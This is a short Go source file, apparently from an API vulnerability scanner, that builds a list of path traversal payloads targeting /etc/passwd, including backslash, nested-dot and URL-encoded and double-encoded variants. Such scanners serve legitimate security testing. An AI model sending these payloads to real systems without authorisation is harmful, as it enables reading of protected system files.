package payload

import "github.com/alkaid/goapiscanner/internal/model"

func traversal() []Item {
	vals := []string{
		"../../../etc/passwd",
		"..\\..\\..\\etc\\passwd",
		"....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"/etc/passwd",
		"..%252f..%252fetc/passwd",
	}
	out := make([]Item, 0, len(vals))
	for _, v := range vals {
		out = append(out, Item{Class: model.ClassTraversal, Value: v, Hint: "dot-dot"})
	}
	return out
}
